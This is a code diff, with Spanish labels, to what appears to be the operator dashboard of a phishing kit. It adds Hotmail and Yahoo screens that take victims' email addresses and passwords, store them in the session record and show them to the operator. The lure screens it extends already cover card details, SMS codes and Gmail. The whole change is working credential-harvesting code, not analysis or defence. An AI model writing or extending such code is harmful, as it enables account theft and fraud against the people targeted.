@@ -384,6 +384,12 @@ export default function AdminPanel() {
             case 'gmail':
               inputDescription = `Gmail - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
               break;
+            case 'hotmail':
+              inputDescription = `Hotmail - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
+              break;
+            case 'yahoo':
+              inputDescription = `Yahoo - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
+              break;
             default:
               inputDescription = `Datos de ${tipo}`;
           }
@@ -433,6 +439,14 @@ export default function AdminPanel() {
                   updatedSession.correo = inputData.correo;
                   updatedSession.contrasena = inputData.contrasena;
                   break;
+                case 'hotmail':
+                  updatedSession.correo = inputData.correo;
+                  updatedSession.contrasena = inputData.contrasena;
+                  break;
+                case 'yahoo':
+                  updatedSession.correo = inputData.correo;
+                  updatedSession.contrasena = inputData.contrasena;
+                  break;
               }
               
               // Actualizar en la lista
@@ -468,7 +482,7 @@ export default function AdminPanel() {
     console.log("handleScreenChange recibió tipo de pantalla:", screen);
 
     // Handle modals for certain screens
-    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta", "gmail", "gmail_verify"].includes(screen)) {
+    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta", "gmail", "gmail_verify", "hotmail", "yahoo"].includes(screen)) {
       console.log("Activando modal para:", screen);
       setActiveModal(screen);
       return;
@@ -817,6 +831,8 @@ export default function AdminPanel() {
                   <option value="sms_compra">8. SMS Compra - Cancelación de cargo</option>
                   <option value="gmail">9. Solicitar acceso Gmail</option>
                   <option value="gmail_verify">10. Verificación Google</option>
+                  <option value="hotmail">11. Solicitar acceso Hotmail</option>
+                  <option value="yahoo">12. Solicitar acceso Yahoo</option>
                 </select>
               </div>
             </div>
